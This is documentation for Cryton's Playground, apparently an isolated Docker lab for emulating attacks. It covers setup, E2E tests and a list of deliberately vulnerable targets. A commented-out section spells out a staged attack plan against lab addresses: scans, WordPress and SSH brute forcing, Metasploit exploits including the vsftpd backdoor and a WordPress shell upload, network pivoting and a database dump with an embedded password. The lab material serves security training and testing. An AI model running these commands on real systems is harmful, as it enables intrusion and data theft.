Playground is an isolated Docker environment where you can test Cryton's capabilities.

[//]: # (TODO: create infra image)

- With a single command you can build the whole infrastructure
- With a single command you can run a predefined attack plan
- It will run on your machine
- It takes minutes to build and is easy to reset
- It allows you to quickly run E2E tests

??? note "Limitations"

    Docker Compose configuration doesn't allow custom gateways/routers which results in creating overlying networks that simulate separated networks.

## Setup

!!! danger "Requirements"

    - [Git](https://git-scm.com/)
    - [Docker Compose](https://docs.docker.com/compose/install/){target="_blank"}
    - System with **8192 MB of RAM** and **4 CPU cores**

[//]: # (TODO: playground moved to cryton repository, update the guide)

First, we clone the repository and switch into it:
```shell
git clone https://gitlab.ics.muni.cz/cryton/cryton.git
cd cryton
```

Now, we build the infrastructure:
```shell
docker compose up -d
```

Once we are done, Cryton toolset and vulnerable targets should be up and running.

## Run the prepared scenario
We have prepared an example attack scenario that uses multiple Cryton features ([session management](design-phase/step.md#session-management),
[output sharing](design-phase/step.md#output-sharing), [conditional execution](design-phase/step.md#conditional-execution), ...).

First, enter the container with Cryton CLI
```shell
docker exec -it cryton-cli bash
```

and then run the following script to automatically prepare and execute the scenario:
```shell
/opt/resources/run_scenario_1.sh
```

Progress and results can be viewed in the *front-end* at [http://localhost:8080/](http://localhost:8080/).

??? note "Instructions for manually running the scenario"

    Register and check the Worker:
    ```shell
    cryton-cli workers create attacker
    cryton-cli workers health-check <worker-id>
    ```
    
    Validate the template:
    ```shell
    cryton-cli plans validate /opt/resources/template.yml -i /opt/resources/inventory.yml
    ```
    
    Upload the template, create a Plan and a Run:
    ```shell
    cryton-cli plan-templates create /opt/resources/template.yml
    cryton-cli plans create <plan-template-id> -i /opt/resources/inventory.yml
    cryton-cli runs create <plan-id> <worker-id>
    ```
    
    Execute the Run:
    ```shell
    cryton-cli runs execute <run-id>
    ```
    
    Check status of the Run:
    ```shell
    cryton-cli runs show <run-id>
    ```
    
    Generate Run report:
    ```shell
    cryton-cli runs report <run-id>
    ```

## Create your own scenario
If you know what you're doing, you can try to come up with your own attack plan.

Feel free to access the Worker container and try to find vulnerabilities and attack vectors that you could utilize in your
final scenario. If the provided infrastructure is not ideal for your needs, you can also add more containers.

??? question "How do I access a container?"

    Generally you want to start an interactive session inside the container using:
    ```shell
    docker compose exec -it <container_name> bash
    ```
    
    To access the Worker container use:
    ```shell
    docker compose exec -it cryton_worker bash
    ```

### E2E testing

[//]: # (TODO: must be updated)

If you're trying to develop a new feature for the Cryton toolset, you might want to run some tests. That can be troublesome
if you need to test many components or run multiple tests multiple times.

First, we need to link all necessary components to the **cryton-playground** directory (**make sure you are in the correct directory** `cd cryton-playground`):
```shell
ln -s /path/to/cryton-cli cryton-cli
ln -s /path/to/cryton-core cryton-core
ln -s /path/to/cryton-worker cryton-worker
ln -s /path/to/cryton-frontend cryton-frontend
ln -s /path/to/cryton-modules cryton-modules
ln -s /path/to/cryton-e2e cryton-e2e
```

???+ question "Do I need to link all components?"

    If you've updated only one component, there is no need to download and link other components. However, you need to
    remove the service(s) that you haven't changed (linked) from the `docker-compose.e2e.yml` file.

Rebuild the infrastructure:
```shell
docker compose down -t 0 && docker compose -f docker-compose.yml -f docker-compose.e2e.yml up -d --build
```

Run e2e tests:
```shell
docker compose exec cryton_cli cryton-e2e run-tests
```

More information can be found [here](development/e2e-testing.md).

---

## Troubleshooting

### Unable to build the infrastructure
Make sure the address pools the playground uses are available.

### Services are not running correctly
If you're having problems with the services (they keep restarting for example):

1. Shut down the running infrastructure with no timeout:
    ```shell
    docker compose down -t 0
    ```

2. Remove all unused data, volumes, and images:
    ```shell
    docker system prune --volumes --all
    ```

3. Build the Infrastructure again:
    ```shell
    docker compose up -d
    ```

### Proxy settings
If you're using a proxy, paste the following settings into `~/.docker/config.json` on your host:
```
{
 "proxies":
 {
   "default":
   {
     "httpProxy": "<proxy-address>",
     "httpsProxy": "<proxy-address>",
     "noProxy": "localhost,.cryton"
   }
 }
}
```

---

## Infrastructure

[//]: # (TODO: once the playground is moved, create a picture, remove this section and paste the image at the beginning)

**core.cryton**
Contains Cryton Core, Apache proxy, CLI (optionally cryton-e2e).

IP addresses:

- 192.168.90.10

**worker.cryton**
Contains Cryton Worker, MSF, Empire C2.

IP addresses:

- 192.168.90.11
- 192.168.91.11

**cryton_frontend**
Contains Cryton Frontend.

IP addresses:

- 192.168.90.12

**db.cryton**
Contains DB server.

IP addresses:

- 192.168.90.13

**pgbouncer.cryton**
Contains PgBouncer server.

IP addresses:

- 192.168.90.14

**rabbit.cryton**
Contains RabbitMQ server.

IP addresses:

- 192.168.90.15

**wordpress_db**
DB server for WordPress.

IP addresses:

- 192.168.93.11

**wordpress_app**
WordPress application with known credentials.

IP addresses:

- 192.168.91.10
- 192.168.92.10
- 192.168.93.10
- 192.168.94.10

**vulnerable_ftp**
FTP server with a known exploit.

IP addresses:

- 192.168.92.20

**vulnerable_db**
Postgres DB server.

IP addresses:

- 192.168.92.21
- 192.168.94.21

**vulnerable_user_machine**
Contains Ubuntu image with a running SSH service and weak credentials.

IP addresses:

- 192.168.94.20

[//]: # (TODO: move this into some dev file in the playground)

[//]: # (## Plan description)

[//]: # (Here is a bit more detailed description of the plan. It gives you the commands to recreate the Run yourself.)

[//]: # ()
[//]: # (### Stage 1a - DMZ information gathering)

[//]: # ()
[//]: # (#### Scan DMZ)

[//]: # (```shell)

[//]: # (nmap -sV 192.168.91.0/24 -p80,3306 --exclude 192.168.91.11 -sV --open)

[//]: # (```)

[//]: # ()
[//]: # (#### Scan WordPress website)

[//]: # (```shell)

[//]: # (wpscan 192.168.91.10)

[//]: # (```)

[//]: # ()
[//]: # (### Stage 1b - WordPress exploitation)

[//]: # ()
[//]: # (#### Get WordPress credentials using bruteforce)

[//]: # (```shell)

[//]: # (nmap --script http-wordpress-brute --script-args 'userdb=users.txt,passdb=passwds.txt,http-wordpress-brute.threads=3,brute.firstonly=true' 192.168.91.10)

[//]: # (```)

[//]: # ()
[//]: # (#### Get session using exploit)

[//]: # (&#40;MSF console&#41;)

[//]: # (```shell)

[//]: # (use unix/webapp/wp_admin_shell_upload)

[//]: # (set rhosts 192.168.91.10)

[//]: # (set username wordpress)

[//]: # (set password wordpress)

[//]: # (set LHOST 192.168.91.30)

[//]: # (exploit -j)

[//]: # (```)

[//]: # ()
[//]: # (### Stage 2a - Server network information gathering)

[//]: # ()
[//]: # (#### Check for interfaces)

[//]: # (```shell)

[//]: # (cat /etc/hosts)

[//]: # (```)

[//]: # ()
[//]: # (#### Create routing table)

[//]: # (&#40;MSF console&#41;)

[//]: # (```shell)

[//]: # (use post/multi/manage/autoroute)

[//]: # (set cmd add)

[//]: # (set session 1)

[//]: # (set SUBNET 192.168.92.0)

[//]: # (run)

[//]: # (```)

[//]: # ()
[//]: # (check the routing table)

[//]: # (```shell)

[//]: # (route print)

[//]: # (```)

[//]: # ()
[//]: # (cleaning the routing table)

[//]: # (```shell)

[//]: # (route flush)

[//]: # (```)

[//]: # ()
[//]: # (#### Scan FTP server)

[//]: # (&#40;MSF console&#41;)

[//]: # (```shell)

[//]: # (use scanner/portscan/tcp)

[//]: # (set PORTS 21)

[//]: # (set RHOSTS 192.168.92.20)

[//]: # (run)

[//]: # (```)

[//]: # ()
[//]: # (#### Scan DB server)

[//]: # (&#40;MSF console&#41;)

[//]: # (```shell)

[//]: # (use scanner/portscan/tcp)

[//]: # (set PORTS 5432)

[//]: # (set RHOSTS 192.168.92.21)

[//]: # (run)

[//]: # (```)

[//]: # ()
[//]: # (### Stage 2b - FTP exploitation)

[//]: # ()
[//]: # (#### Exploit FTP server)

[//]: # (&#40;MSF console&#41;)

[//]: # (```shell)

[//]: # (use unix/ftp/vsftpd_234_backdoor)

[//]: # (set payload cmd/unix/interact)

[//]: # (set RHOSTS 192.168.92.20)

[//]: # (exploit)

[//]: # (```)

[//]: # ()
[//]: # (#### Read logs from the FTP server)

[//]: # (```shell)

[//]: # (cat /var/log/vsftpd.log)

[//]: # (```)

[//]: # ()
[//]: # (### Stage 3a - User network information gathering)

[//]: # ()
[//]: # (#### Create routing table)

[//]: # (&#40;MSF console&#41;)

[//]: # (```shell)

[//]: # (use post/multi/manage/autoroute)

[//]: # (set cmd add)

[//]: # (set session 1)

[//]: # (set SUBNET 192.168.94.0)

[//]: # (run)

[//]: # (```)

[//]: # ()
[//]: # (#### Scan user machine)

[//]: # (&#40;MSF console&#41;)

[//]: # (```shell)

[//]: # (use scanner/portscan/tcp)

[//]: # (set PORTS 22)

[//]: # (set RHOSTS 192.168.94.20)

[//]: # (run)

[//]: # (```)

[//]: # ()
[//]: # (### Stage 3b - User exploitation)

[//]: # ()
[//]: # (#### Bruteforce user credentials)

[//]: # (&#40;MSF console&#41;)

[//]: # (```shell)

[//]: # (use scanner/ssh/ssh_login)

[//]: # (set RHOSTS 192.168.94.20)

[//]: # (set USERNAME victim)

[//]: # (set PASS_FILE /app/resources/pass_list.txt)

[//]: # (set STOP_ON_SUCCESS true)

[//]: # (set BLANK_PASSWORDS true)

[//]: # (set THREADS 5)

[//]: # (run)

[//]: # (```)

[//]: # ()
[//]: # (### Stage 4a - data extraction)

[//]: # ()
[//]: # (#### Check user's bash history)

[//]: # (```shell)

[//]: # (cat ~/.bash_history)

[//]: # (```)

[//]: # ()
[//]: # (#### Dump database)

[//]: # (````shell)

[//]: # (PGPASSWORD=dbpassword pg_dump -h 192.168.94.21 -U dbuser beastdb)

[//]: # (````)

[//]: # (#### Create Socks proxy &#40;deprecated for now&#41;)

[//]: # (&#40;MSF console&#41;)

[//]: # (```shell)

[//]: # (use auxiliary/server/socks_proxy)

[//]: # (set VERSION 4a)

[//]: # (run)

[//]: # (```)

[//]: # ()
[//]: # (#### Scan server network &#40;deprecated for now&#41;)

[//]: # (```shell)

[//]: # (nmap 192.168.62.20 -sT -Pn --proxies socks4://127.0.0.1:1080 -p21 -sV)

[//]: # (```)